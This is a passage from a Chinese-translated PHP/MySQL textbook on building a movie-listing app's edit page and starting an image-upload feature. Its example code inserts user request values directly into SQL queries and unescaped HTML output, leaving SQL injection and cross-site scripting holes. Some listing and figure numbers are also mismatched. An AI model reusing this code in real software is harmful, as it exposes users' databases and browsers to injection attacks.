## 18. 使用 Web 应用程序编辑数据

### 第一步骤

首先，我们将在 <body> 元素内设置的 <h1> 标签中显示“Edit a Movie”标题：

```html
<body>
    <div class="card">
        <div class="card-body">
            <h1>Edit a Movie</h1>
```

接下来，让我们创建一个链接返回到 index.php 页面，如果用户不想更新此电影，以及一条水平线（<hr/> 元素）：

```html
<body>
<div class="card">
    <div class="card-body">
        <h1>Edit a Movie</h1>
        <nav class="nav">
            <a class="nav-link" href="index.php">Movies I Like</a>
        </nav>
        <hr/>
```

与之前的“Remove a Movie”页面一样，我们需要访问我们想要编辑的电影的数据库，因此我们需要包含我们的 dbconnection.php 脚本并连接到我们的 Movie 数据库，如列表 18.1 所示。

### 列表 18.1.

```
1. <body>
2.     <div class="card">
3.         <div class="card-body">
4.             <h1>Edit a Movie</h1>
5.         <p><a class='nav-link' href='index.php'>Movies I Like</a></p>
6.     <hr/>
7.         <?php
8.             require_once('dbconnection.php');
9. 
10.            $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
11.                or trigger_error(
12.                    'Error connecting to MySQL server for' . DB_NAME,
13.                    E_USER_ERROR
14.                );
```

### 预见通往编辑页面的路径

有两种预期方式和各种非预期方式可以导航到 editmovie.php 脚本。第一种预期方式是用户在“Movie Details”页面上选择“edit it”链接，如图 18.4 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_215_0.png)

这样会发送一个包含在 $_GET 超全局变量的 id_to_edit 元素中的单个查询参数。

第二种预期方式是当用户选择“Update Movie”时。当用户在表单字段中成功输入所需数据并提交表单时，我们希望在 Movie 数据库的 movieListing 表中更新此电影的数据。您可以在 $_POST 超全局变量中找到提交的表单字段。

所有其他机制都是非预期的。因此，这基本上给了我们三个我们正在寻找的选择。因此，最好的处理这三个选择的方法是在列表 18.2 中创建 if/elseif/else 代码结构。

### 列表 18.2.

```
$dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
    or trigger_error(
        'Error connecting to MySQL server for ' . DB_NAME,
        E_USER_ERROR
    );

if (isset($_GET['id_to_edit']))
{
    // ...
}
elseif (isset($_POST['edit_movie_submission'], $_POST['movie_title'],
        $_POST['movie_rating'], $_POST['movie_director'],
        $_POST['movie_running_time_in_minutes']))
{
    // ...
}
else // Unintended page link
{
    // ...
}
```

> 在上面的 elseif 代码块中：即使我们在客户端验证字段输入，在服务器端验证字段输入仍然很重要。



## 18. 使用 Web 应用程序编辑数据

### 直接导航

我们将要导航到 editmovie.php 脚本的第一个预期方式是当用户在 moviedetails.php 页面上选择“edit it”链接时。该链接会导致向 editmovie.php 脚本发送 HTTP GET 请求，其中查询参数位于 $_GET 超全局变量中。我们在第一个 if 块中处理它：

```
if (isset($_GET['id_to_edit']))
{
```

当我们到达此条件时，我们想要编辑的电影的主键由 id_to_edit 查询参数引用。

请查看图 18.5 所示的表单。

你会注意到字段已预先填充了电影详细信息。为此，我们需要在显示表单之前查询 movieListing 表以获取电影详细信息。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_216_0.png)

请注意，图 18.6 中，“Genre”复选框已根据设定的电影类型正确选中。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_216_1.png)

为了显示“Genre”复选框——就像在 addmovie.php 脚本中一样——我们需要一个数组来保存每种类型的名称。就在 if 块上方，但在 mysqli_connect() 函数调用之后，添加来自列表 18.3 的 $genres 数组。

### 列表 18.5.

```
1. $result = mysqli_query($dbc, $query)
2.
    or trigger_error('Error querying database movieListing', E_USER_ERROR);
3.
4. if (mysqli_num_rows($result) == 1)
5. {
6.    $row = mysqli_fetch_assoc($result);
7.
8.    $movie_title = $row['title'];
9.    $movie_rating = $row['rating'];
10.   $movie_director = $row['director'];
11.   $movie_runtime = $row['running_time_in_minutes'];
12.   $movie_genre_text = $row['genre'];
13.
14.   $checked_movie_genres = explode(', ', $movie_genre_text);
15. }
```

请注意最后一行代码：

```
$checked_movie_genres = explode(', ', $movie_genre_text);
```

explode()[2] 函数获取存储在此电影中的以逗号分隔的类型列表，并将其转换为名为 $checked_movie_genres 的数组。使用它可以将此字符串：

```
'Action,Adventure,Science Fiction'
```

转换为此数组：

```
$checked_movie_genres[0] = 'Action'
$checked_movie_genres[1] = 'Adventure'
$checked_movie_genres[2] = 'Science Fiction'
```

因此我们可以使用它来填充“Genre”的正确复选框。

此 if 块的完整代码如下所示，见列表 18.6。

### 列表 18.6.

```php
if (isset($_GET['id_to_edit']))
{
    $id_to_edit = $_GET['id_to_edit'];

    $query = "SELECT * FROM movieListing WHERE id = $id_to_edit";

    $result = mysqli_query($dbc, $query)
        or trigger_error('Error querying database movieListing', E_USER_ERROR);

    if (mysqli_num_rows($result) == 1)
    {
        $row = mysqli_fetch_assoc($result);

        $movie_title = $row['title'];
        $movie_rating = $row['rating'];
        $movie_director = $row['director'];
        $movie_runtime = $row['running_time_in_minutes'];
        $movie_genre_text = $row['genre'];

        $checked_movie_genres = explode(', ', $movie_genre_text);
    }
}
```

### 为类型考虑数据库关系

> *请注意，上面我们使用 explode() 来分隔存储在数据库中的以逗号分隔的类型字符串。上述解决方案的问题在于它使我们的类型列表非规范化——顺便说一下，该列表是从 addmovie.php 脚本中硬编码的。更好的、更长期的解决方案是创建一个保存所有类型的数据库表，然后创建一个表示电影与类型之间多对多关系的交叉引用（或 JOIN 表）。这种方法的优点是更容易维护/修改类型，因为它完全包含在数据模型中。 minor 的缺点是它增加了 SQL 查询的一些复杂性。我将其作为重构练习留给你，在应用程序中实现此改进。*

### 显示编辑表单

在添加另外两个条件的代码之前，我们创建用于更新电影的表单。我们将其添加到 unintended 条件 else 块下方。此表单应与 addmovie.php 脚本的表单非常相似，只是字段已使用我们刚刚从数据库查询的数据预先填充。列表 18.7 是表单的代码。请注意此表单与 addmovie.php 中的表单之间的一些差异。

```
</div>
</div>
<div class="form-group row">
    <label for="movie_running_time_in_minutes"
        class="col-sm-3 col-form-label-lg">Running Time (min)</label>
    <div class="col-sm-8">
        <input type="number" class="form-control"
            id="movie_running_time_in_minutes"
            name="movie_running_time_in_minutes"
            value="<?= $movie_runtime ?>"
            placeholder="Running time (in minutes)" required>
        <div class="invalid-feedback">
            Please provide a valid running time in minutes.
        </div>
    </div>
</div>
<div class="form-group row">
    <label class="col-sm-3 col-form-label-lg">Genre</label>
    <div class="col-sm-8">
        <?php
        foreach ($genres as $genre) {
        ?>
            <div class="form-check form-check-inline col-sm-3">
                <input class="form-check-input" type="checkbox"
                    id="movie_genre_checkbox_action_<?= $genre ?>"
                    name="movie_genre_checkbox[]"
                    value="<?= $genre ?>"
                    <?= in_array($genre, $checked_movie_genres) ? 'checked' : '' ?>>
                <label class="form-check-label"
                    for="movie_genre_checkbox_action_<?= $genre ?>"><?= $genre ?></label>
            </div>
        <?php
        }
        ?>
    </div>
</div>
<button class="btn btn-primary" type="submit" name="edit_movie_submission">Update Movie
</button>
<input type="hidden" name="id_to_update" value="<?= $id_to_edit ?>">
</form>
```

### 使字段保持粘性

以电影标题的输入文本字段为例：

```
<input type="text" class="form-control" id="movie_title"
    name="movie_title" value="<?= $movie_title ?>"
    placeholder="Title" required>
```

请注意 value 属性被设置为 $movie_title 变量的值。该变量来自我们之前查询返回的 movieListing 数据库表中该电影行的 title 字段。

```
value="<?= $movie_title ?>"
```

这些输入字段的 value 属性需要为电影标题、导演和运行时间设置：

```
... name="movie_title" value="<?= $movie_title ?>" ...
... name="movie_director" value="<?= $movie_director ?>" ...
... name="movie_running_time_in_minutes" value="<?= $movie_runtime ?>" ...
```

value 属性也需要为评级选择和类型复选框设置。然而，它们有点棘手。首先我们来处理评级选择：

```
<select class="custom-select" id="movie_rating" name="movie_rating"
    value="<?= $movie_rating ?>" required>
<option value="" disabled selected>Rating...</option>
<option value="G" <?= $movie_rating=='G' ? 'selected' : '' ?>>G</option>
<option value="PG" <?= $movie_rating=='PG' ? 'selected' : '' ?>>PG</option>
<option value="PG-13" <?= $movie_rating=='PG-13' ? 'selected' : '' ?>>PG-13</option>
<option value="R" <?= $movie_rating=='R' ? 'selected' : '' ?>>R</option>
</select>
```

在 select 中，默认只能选择一个选项。因此，我使用了三元运算符 (?:) 在向 movie_rating select 添加每个选项时检查该选项是否等于该电影的评级。如果选项相等，我将该选项设置为 selected。否则，我将该选项设置为空字符串 ('')。

为类型复选框设置 value 属性也有一点棘手，并且需要使用三元运算符。类似于我们在 addmovie.php 中显示“Genre”复选框的方式，列表 18.8 中的代码和标记为 genres 数组中的每个项目创建一个复选框输入。用户选择的每个类型都会添加到 movie_genre_checkbox 数组中——请注意 name 属性中添加的 []。请注意，如果用户未选择任何类型，movie_genre_checkbox name 属性将不存在于 $_POST[] 超全局数组中。




### 清单18.8

```
<?php
foreach ($genres as $genre) {
?>
<div class="form-check form-check-inline col-sm-3">
<input class="form-check-input" type="checkbox"
id="movie_genre_checkbox_<?= $genre ?>"
name="movie_genre_checkbox[]"
value="<?= $genre ?>"<?= in_array($genre, $checked_movie_genres) ? 'checked' : '' ?>
<label class="form-check-label"
for="movie_genre_checkbox_action_<?= $genre ?>"> <?= $genre ?></label>
</div>
<?php
}
?>
```

请注意，我在 value 属性中添加了是否选中该流派的信息，使用的是三元运算符：

```
... value="<?= $genre ?>" <?= in_array($genre, $checked_movie_genres) ? 'checked' : '' ?> ...
```

在 addmovie.php 中，我们仅有：

```
... value="<?= $genre ?>" ...
```

然而，我们想知道某个特定流派是否被选中，而该信息包含在我们之前使用 `explode()` 函数创建的 `$checked_movie_genres` 数组中。使用 `in_array()` 函数，我们可以判断 `$genre`（当前在 `$genres` 数组的 foreach 循环中处理的流派）是否包含在 `$checked_movie_genres` 数组中。如果 `$genre` 存在，`in_array()` 返回 true，否则返回 false。我们可以使用三元运算符，在找到该流派时为其添加 `checked`（'checked'）属性，如果未找到则添加空字符串（' '）：

```
... <?= in_array($genre, $checked_movie_genres) ? 'checked' : '' ?> ...
```

## 使用 Bootstrap 的客户端验证

与 addmovie.php 脚本一样，我们使用 Bootstrap 的客户端验证。这要求我们执行以下操作：

- 1. 将表单的 class 属性设置为 `needs-validation`，并添加 `novalidate` 属性：

```
<form class="needs-validation" novalidate ...
```

[3] in_array()：https://php.net/in_array

## 18. 使用 Web 应用编辑数据

- 2. 为输入元素标记 `required` 属性，以确保我们希望验证的字段得到验证：

```
<input type="number" ... required>
```

- 3. 添加 class 属性设置为 `invalid-feedback` 的 `<div>` 元素，其中包含我们希望用户忘记填写字段时看到的验证文本。同样，我们直接将这些元素添加到我们想要验证的 `<input>` 元素下方。清单 18.9 是“Running Time”输入字段的完整 HTML 标记，以及我们希望用户忘记输入值时看到的无效反馈。

### 清单18.9

```
1. <div class="form-group row">
2.   <label for="movie_running_time_in_minutes"
3.     class="col-sm-3 col-form-label-lg">Running Time (min)</label>
4.   <div class="col-sm-8">
5.     <input type="number" class="form-control"
6.       id="movie_running_time_in_minutes"
7.       name="movie_running_time_in_minutes"
8.       value="<?= $movie_runtime ?>"
9.       placeholder="Running Time (in minutes)" required>
10.     <div class="invalid-feedback">
11.       Please provide a valid running time in minutes.
12.     </div>
13.   </div>
14. </div>
```

- 4. 将清单 18.10 中的 JavaScript 代码添加到表单后的 `<script>` 标签中。

### 清单18.10

```
1. </form>
2. <script>
3. // JavaScript for disabling form submissions if there are invalid fields
4. (function() {
5.   'use strict';
6.   window.addEventListener('load', function() {
7.     // Fetch all the forms we want to apply custom Bootstrap validation styles to
8.     var forms = document.getElementsByClassName('needs-validation');
9.     // Loop over them and prevent submission
10.     var validation = Array.prototype.filter.call(forms, function(form) {
11.       form.addEventListener('submit', function(event) {
12.         if (form.checkValidity() === false) {
13.           event.preventDefault();
14.           event.stopPropagation();
15.         }
16.         form.classList.add('was-validated');
17.       }, false);
18.     });
19.   }, false);
20. }());
21. </script>
```

## DRY？

*这看起来像是在重复 addmovie.php 脚本中的代码，不是吗？在这种情况下，由于我们使用的是样板式的 Bootstrap 验证代码，将 JavaScript 代码放在表单下方的匿名函数中更合理。*

## 按下更新按钮

这是我们导航到 editmovie.php 页面的第二种预期方式。因此，我们将处理 `elseif` 块：

```
```php
elseif (isset($_POST['edit_movie_submission'], $_POST['movie_title'],
    $_POST['movie_rating'], $_POST['movie_director'],
    $_POST['movie_running_time_in_minutes'], $_POST['id_to_update'])) {
```
```

当我们进入此条件时，是因为用户点击了 **Update Movie** 提交按钮。这样会将表单变量 `edit_movie_submission`、`movie_title`、`movie_rating`、`movie_director`、`movie_running_time_in_minutes` 和 `id_to_update` 通过 POST 方式回传到 editmovie.php，并存储在 `$_POST[]` 超全局数组中。注意，由于流派是可选的，我们不检查它是否已设置。

说到 `id_to_update`，请注意我在表单中创建了一个隐藏的 `<input>` 元素，并将其值设置为电影的 ID，同时将 name 属性设置为 `id_to_update`。当表单数据被回传到 editmovie.php 时，该 ID 可在 `$_POST[]` 超全局数组中获得，以便在数据库中更新它：

```
```html
<input type="hidden" name="id_to_update" value="<?= $id_to_edit ?>">
```
```

我们需要这样做，以便承载最初调用 editmovie.php 时通过查询参数发送的电影 ID。请记住，HTTP 请求和响应不保留任何状态或信息。

> *请参阅上一章中题为“WEB 是无状态的！”的补充说明。*

当第一次进入传入表单或查询参数的条件时，我为每个参数创建了单独的变量。同样，这不是必需的，如果你为表单字段创建了描述性名称并使用 `$_POST` 超全局变量访问它们，代码同样可读。然而，我发现这样更容易输入，而且变量的用途一目了然，前提是你使用了足够描述性的名称。将清单 18.11 中的代码立即添加到 `elseif` 行下方及其内部。

## 18. 使用 Web 应用编辑数据

### 清单18.11

```
```php
1. elseif (isset($_POST['edit_movie_submission'], $_POST['movie_title'],
2.     $_POST['movie_rating'], $_POST['movie_director'],
3.     $_POST['movie_running_time_in_minutes'], $_POST['id_to_update']))
4. {
5.
6.     $movie_title = $_POST['movie_title'];
7.     $movie_rating = $_POST['movie_rating'];
8.     $movie_director = $_POST['movie_director'];
9.     $movie_runtime = $_POST['movie_running_time_in_minutes'];
10.    $checked_movie_genres = $_POST['movie_genre_checkbox'];
11.    $id_to_update = $_POST['id_to_update'];
```
```

我们还需要从复选框数组构建一个包含电影流派的逗号分隔字符串。接下来添加以下代码：

```
```php
$movie_genre_text = "";

if (isset($checked_movie_genres))
{
    $movie_genre_text = implode(", ", $checked_movie_genres);
}
```
```

与 addmovie.php 脚本一样，一部电影可以有多个流派。为了存储所有流派，我们通过调用 `implode()`[4] 函数，从复选框数组中创建一个所选流派的逗号分隔列表。我们仅在用户至少选择一个流派时才这样做。如果用户没有选择任何流派，复选框数组就不存在。因此，在调用 `implode()` 之前，我们需要检查它是否已设置。如果用户没有选择流派，我们在 movielisting 表的 genre 字段中插入一个空字符串。

现在我们已经将所有更新后的电影数据以所需形式准备好了，就可以使用 SQL UPDATE 查询更新 movieListing 表。

SQL UPDATE 查询如下所示：

```
```sql
UPDATE <table_name> SET <field_name> = <value_[, ...]> WHERE <condition>
```
```

因此，我们的查询字符串和对 `mysqli_query()` 的调用应类似于清单 18.12。

[4] implode()：https://php.net/implode

### 清单18.12

```
$query = "UPDATE movieListing SET title = '$movie_title', rating = '$movie_rating', "
. "director = '$movie_director', running_time_in_minutes = '$movie_runtime', "
. "genre = '$movie_genre_text' "
. "WHERE id = $id_to_update";

mysqli_query($dbc, $query)
or trigger_error(
'Error querying database movielisting: Failed to update movie listing',
E_USER_ERROR
);
```

最后，我们可以使用该电影的 ID 作为查询参数导航回 moviedetails.php，以显示更新后的电影详情，代码如下：

```
$nav_link = 'moviedetails.php?id=' . $id_to_update;

header("Location: $nav_link");
exit;
```

这个 `elseif` 块的完整代码如清单 18.13 所示。

### 清单18.13

```
elseif (isset($_POST['edit_movie_submission'], $_POST['movie_title'],
$_POST['movie_rating'], $_POST['movie_director'],
$_POST['movie_running_time_in_minutes'], $_POST['id_to_update']))
{

$movie_title = $_POST['movie_title'];
$movie_rating = $_POST['movie_rating'];
$movie_director = $_POST['movie_director'];
$movie_runtime = $_POST['movie_running_time_in_minutes'];
$checked_movie_genres = $_POST['movie_genre_checkbox'];
$id_to_update = $_POST['id_to_update'];

$movie_genre_text = "";

if (isset($checked_movie_genres))
{
$movie_genre_text = implode(", ", $checked_movie_genres);
}

$query = "UPDATE movieListing SET title = '$movie_title', rating = '$movie_rating', "
. "director = '$movie_director', running_time_in_minutes = '$movie_runtime', "
. "genre = '$movie_genre_text' "
. "WHERE id = $id_to_update";
```




## 18. 使用 Web 应用程序编辑数据

```
mysqli_query($dbc, $query)
    or trigger_error(
        'Error querying database movieListing: Failed to update movie listing',
        E_USER_ERROR
    );

$nav_link = 'moviedetails.php?id=' . $id_to_update;

header("Location: $nav_link");
exit;
}
```

所以，假设我们想为一部电影增加五分钟，因为 IMDB[5] 可能没有考虑到片尾字幕场景。我们还认为这部电影也适合“Drama”和“Fantasy”类型。因此，我们的编辑可能看起来像图 18.7。

应用程序将用户引导至“Movie Details”页面，在那里他们可以立即看到结果（图 18.8）。

### 意外导航方法

与上一章一样，由于 HTTP 请求来自客户端。理论上，未预期的或恶意的参数可能出现在查询字符串中（甚至是 HTTP POST 的字段参数）。因此，我们可以导航到 editmovie.php 页面的所有其他条件都是非预期的，我们将处理 else 块：

```
else // Unintended page link
{
```

与上一章一样，由于上述所有条件都是我们希望应用程序以特定方式运行的条件，因此最佳实践是将应用程序对不可预测行为的响应放在 else 条件中。在这种情况下，我们只想链接回主要的“Movies I Like” index.php 页面：

[5] IMDB: https://imdb.com

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_228_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_228_1.png)

```
else // Unintended page link - No movie to edit, redirect back to index
{
    header("Location: index.php");
    exit();
}
```

### 完整代码列表

列表 18.14 包含 editmovie.php 页面的完整列表。

### 列表 18.14.

```
1. <html>
2. <head>
3.   <link rel="stylesheet"
4.         href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
5.         integrity="sha384-GJzZqFwbIqT1N6wY59FF1BuG..."
6.         crossorigin="anonymous">
7.   <title>Edit a Movie</title>
8. </head>
9. <body>
10. <div class="card">
11.   <div class="card-body">
12.     <h1>Edit a Movie</h1>
13.     <nav class="nav">
14.       <a class="nav-link" href="index.php">Movies I Like</a>
15.     </nav>
16.     <hr/>
17. <?php
18. require_once('dbconnection.php');
19. 
20. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
21.     or trigger_error(
22.         'Error connecting to MySQL server for ' . DB_NAME,
23.         E_USER_ERROR
24.     );
25. 
26. $genres = [
27.     'Action', 'Adventure', 'Comedy', 'Documentary', 'Drama',
28.     'Fantasy', 'Horror', 'Romance', 'Science Fiction'
29. ];
30. 
31. if (isset($_GET['id_to_edit'])) {
32.     $id_to_edit = $_GET['id_to_edit'];
33. 
34.     $query = "SELECT * FROM movielisting WHERE id = $id_to_edit";
35. 
36.     $result = mysqli_query($dbc, $query)
37.         or trigger_error('Error querying database movielisting', E_USER_ERROR);
```

```
if (mysqli_num_rows($result) == 1) {
$row = mysqli_fetch_assoc($result);
$movie_title = $row['title'];
$movie_rating = $row['rating'];
$movie_director = $row['director'];
$movie_runtime = $row['running_time_in_minutes'];
$movie_genre_text = $row['genre'];
$checked_movie_genres = explode(', ', $movie_genre_text);
}
} elseif (isset($_POST['edit_movie_submission'], $_POST['movie_title'],
$_POST['movie_rating'], $_POST['movie_director'],
$_POST['movie_running_time_in_minutes'])) {
$movie_title = $_POST['movie_title'];
$movie_rating = $_POST['movie_rating'];
$movie_director = $_POST['movie_director'];
$movie_runtime = $_POST['movie_running_time_in_minutes'];
$checked_movie_genres = $_POST['movie_genre_checkbox'];
$id_to_update = $_POST['id_to_update'];
$movie_genre_text = "";
if (isset($checked_movie_genres)) {
$movie_genre_text = implode(", ", $checked_movie_genres);
}
$query = "UPDATE movielisting SET title = '$movie_title', rating = '$movie_rating', "
. "director = '$movie_director', running_time_in_minutes = '$movie_runtime', "
. "genre = '$movie_genre_text' "
. "WHERE id = $id_to_update";
mysqli_query($dbc, $query)
or trigger_error(
'Error querying database movielisting: Failed to update movie listing',
E_USER_ERROR
);
$nav_link = 'moviedetails.php?id=' . $id_to_update;
header("Location: $nav_link");
exit;
} else // Unintended page link - No movie to edit, link back to index
{
header("Location: index.php");
exit;
}
?>
<form class="needs-validation" novalidate method="POST"
action="<?php echo $_SERVER['PHP_SELF']; ?>">
```

```
<div class="form-group row">
    <label for="movie_title"
           class="col-sm-3 col-form-label-lg">Title</label>
    <div class="col-sm-8">
        <input type="text" class="form-control"
               id="movie_title" name="movie_title"
               value="<?= $movie_title ?>"
               placeholder="Title" required>
        <div class="invalid-feedback">
            Please provide a valid movie title.
        </div>
    </div>
</div>
<div class="form-group row">
    <label for="movie_rating"
           class="col-sm-3 col-form-label-lg">Rating</label>
    <div class="col-sm-8">
        <select class="custom-select" id="movie_rating"
                name="movie_rating"
                value="<?= $movie_rating ?>" required>
            <option value="" disabled selected>Rating...
            </option>
            <option value="G" <?= $movie_rating == 'G' ? 'selected' : '' ?>>G
            </option>
            <option value="PG" <?= $movie_rating == 'PG' ? 'selected' : '' ?>>PG
            </option>
            <option value="PG-13" <?= $movie_rating == 'PG-13' ? 'selected' : '' ?>>PG-13
            </option>
            <option value="R" <?= $movie_rating == 'R' ? 'selected' : '' ?>>R
            </option>
        </select>
        <div class="invalid-feedback">
            Please select a movie rating.
        </div>
    </div>
</div>
<div class="form-group row">
    <label for="movie_director"
           class="col-sm-3 col-form-label-lg">Director</label>
    <div class="col-sm-8">
        <input type="text" class="form-control"
               id="movie_director" name="movie_director"
               value="<?= $movie_director ?>"
               placeholder="Director" required>
        <div class="invalid-feedback">
            Please provide a valid movie director.
        </div>
    </div>
</div>
<div class="form-group row">
```

```
140. <label for="movie_running_time_in_minutes"
141. class="col-sm-3 col-form-label-lg">Running Time (min)</label>
142. <div class="col-sm-8">
143. <input type="number" class="form-control"
144. id="movie_running_time_in_minutes"
145. name="movie_running_time_in_minutes"
146. value="<?= $movie_runtime ?>"
147. placeholder="Running time (in minutes)"
148. required>
149. <div class="invalid-feedback">
150. Please provide a valid running time in minutes.
151. </div>
152. </div>
153. </div>
154. <div class="form-group row">
155. <label class="col-sm-3 col-form-label-lg">Genre</label>
156. <div class="col-sm-8">
157. <?php
158. foreach ($genres as $genre) {
159. ?>
160. <div class="form-check form-check-inline col-sm-3">
161. <input class="form-check-input"
162. type="checkbox"
163. id="movie_genre_checkbox_action_<?= $genre ?>"
164. name="movie_genre_checkbox[]"
165. value="<?= $genre ?>"
166. <?= in_array($genre, $checked_movie_genres) ? 'checked' : '' ?>>
167. <label class="form-check-label"
168. for="movie_genre_checkbox_action_<?= $genre ?>"><?= $genre ?></label>
169. </div>
170. <?php
171. }
172. ?>
173. </div>
174. </div>
175. <button class="btn btn-primary" type="submit"
176. name="edit_movie_submission">Update Movie
177. </button>
178. <input type="hidden" name="id_to_update"
179. value="<?= $id_to_edit ?>">
180. </form>
181. <script>
182. // Javascript for disabling form submissions if there are invalid fields
183. (function () {
184. 'use strict';
185. window.addEventListener('load', function () {
186. // Fetch all the forms we want to apply custom Bootstrap validation styles to
187. var forms = document.getElementsByClassName('needs-validation');
188. // Loop over them and prevent submission
189. var validation = Array.prototype.filter.call(forms, function (form) {
```


```
190. form.addEventListener('submit', function (event) {
191.     if (form.checkValidity() == false) {
192.         event.preventDefault();
193.         event.stopPropagation();
194.     }
195.     form.classList.add('was-validated');
196. }, false);
197. });
198. }, false);
199. })();
200. </script>
201. </div>
202. </div>
203. <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
204.     integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRvZvpbozo5snXKpYv9FvH8abtTE1Pi6jizo"
205.     crossorigin="anonymous"></script>
206. <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
207.     integrity="sha384-wHAiFfRl0JNyYfwEtBMjAuKBPNaej1Ygc/CyP2dxK4EtS3Ump9KsGTTf+hJ9oEoQ"
208.     crossorigin="anonymous"></script>
209. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
210.     integrity="sha384-B0UglyR+jN8CRmK6ySgOomIV+1pTzqiPrXUSAWsF2FlN5xOPEJOGVYXdr2jXn4Wq"
211.     crossorigin="anonymous"></script>
212. </body>
213. </html>
```

## 练习

- 1. 添加一个“编辑电影”页面，并在详情页添加一个更新电影的按钮。
- 2. 加分项：将“电影类型”字段从逗号分隔的文本字段改为“类型”表。请参阅“从 moviedetails.php 导航到 editmovie.php”一节末尾的附注。

## 处理文件与现有代码的功能新增

> > “我最有效率的日子之一，就是扔掉了一千行代码。”
> 
> >——肯·汤普森

## 19. 处理文件与现有代码的功能新增

在本章中，我们将为*电影列表*应用程序添加上传和显示图片的功能。

假设我们的*电影列表*应用程序已经上线，有用户说：“嘿，我真的很喜欢这个应用，但如果能为每部电影添加一张缩略图那就太棒了。你能做到吗？”

虽然这句话说起来很简单，但添加这一功能确实需要修改不少 PHP 脚本。而且，根据我们的实现方式，可能需要修改所有 PHP 脚本。因此，让用户了解进展并展示不同的用例和截图是有意义的。不过这超出了本书的范围，所以我直接描述我认为这个功能应有的外观、工作方式以及需要修改的内容：

- 1. 在 `movielisting` 数据库表中添加一个字段，用于存储文件信息（详见下文）。
- 2. 创建一个 `images/` 文件夹，用于存放电影图片。
- 3. 修改 `addmovie.php`，使用户能够上传电影图片，并将其添加到数据库中的电影详细信息条目中。同时，在添加电影后，在“添加电影”页面上显示该图片。图片上传应为可选项。
- 4. 修改 `index.php`，在每行电影开头显示电影缩略图。
- 5. 修改 `moviedetails.php`，在“电影详情”页面上显示图片，以便更好地识别电影。
- 6. 修改 `editmovie.php`，使用户能够（或不）上传另一张电影图片，并修改数据库中的电影详细信息条目。
- 7. 修改 `removemovie.php`，在“删除电影”页面上显示图片，以便更好地识别电影。

### 添加用于文件信息的字段

理论上，我们可以上传图片文件并将图片存储在数据库中。然而，数据库是为快速访问而设计的，而图片文件可能很大。因此，这样做可能会降低查询数据库时的检索速度，尤其是在处理大型数据库时。

更好的解决方案是将图片存储在服务器上的 `images/` 文件夹中。然后，我们在 `movielisting` 表中创建一个字符串字段，用于保存上传图片的文件路径位置。

要向现有表中添加新字段，我们需要 ALTER `movielisting` 表。让我们使用 Adminer 来完成。使用浏览器，以 movieguru 身份登录 Adminer，并创建我们的数据库和表（图 19.1）。

如图 19.2 所示，选择 Movie 数据库。

如图 19.3 所示，选择 `movielisting` 表。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_237_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_237_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_237_2.png)

## 19. 处理文件与现有代码的功能新增

然后选择“更改表”（图 19.4）。

如图 19.5 所示，点击 `genre` 字段后面的 +，在 `movieListing` 表末尾添加一个新字段。

为 `image_file` 字段设置以下属性，如图 19.6 所示：

- 在 `genre` 下方的“列名”中输入 `image_file`。
- 选择类型为 `varchar`。
- 长度为 `100`。

按下“保存”后，表描述应如图 19.7 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_238_0.png)

图 19.4。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_238_1.png)

图 19.5。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_238_2.png)

图 19.6。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_238_3.png)

图 19.7。

### 创建用于存放上传电影图片文件的文件夹

在你存放 `index.php` 脚本的主 Web 文件夹中（我的位于 /MovieListing），创建一个名为 `images/` 的新文件夹，如图 19.8 所示。

注意，你的 Web 服务器必须拥有向此文件夹写入文件的权限。例如，在 *NIX 系统上，如果你的 Web 服务器（如 Apache）以 `www-data` 用户运行，请确保该文件夹可由同一用户写入。

```
$ cd /var/www/public/html/Movielisting
$ sudo chown www-data images
$ sudo chmod u+w images
```

最好也准备一张通用的图片，用于没有配图的电影列表。我将它命名为 `generic_movie.jpg`。

### 添加上传文件功能

我们想修改 `addmovie.php` 脚本，使用户能够（可选地）上传电影图片，并将其添加到数据库中的电影详细信息条目中。然后，在用户添加新电影后，在页面上显示该图片。下面是我们希望它实现的效果。

当第一次导航到我们的“添加电影”页面时，修改后的表单应该如图 19.9 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_239_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_239_1.png)

## 19. 处理文件与现有代码的功能新增

假设我要添加电影《宁静号》。图 19.10 显示了目前为止的详细信息。

假设我已经下载了一张图片，当我像图 19.11 那样选择**选择文件**时，应该会弹出一个文件浏览器窗口，我可以导航到要上传的图片文件，选择它，然后点击**打开**（图 19.12）。

所选文件的名称现在显示在“选择文件”按钮之后（图 19.13），而不再是“未选择文件”。

一旦我们按下**添加电影**（图 19.16），我们希望看到的添加电影详情页面带有我们上传的图片，如图 19.15 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_240_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_240_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_240_2.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_240_3.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_240_4.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_240_5.png)

### 修改表单以允许上传

我们需要在 `addmovie.php` 表单中添加两个主要内容以支持文件上传。首先，我们需要在 `<form>` 元素中添加 `enctype` 属性，并将其设置为 `multipart/form-data`：

```
<form enctype="multipart/form-data" ...>
```

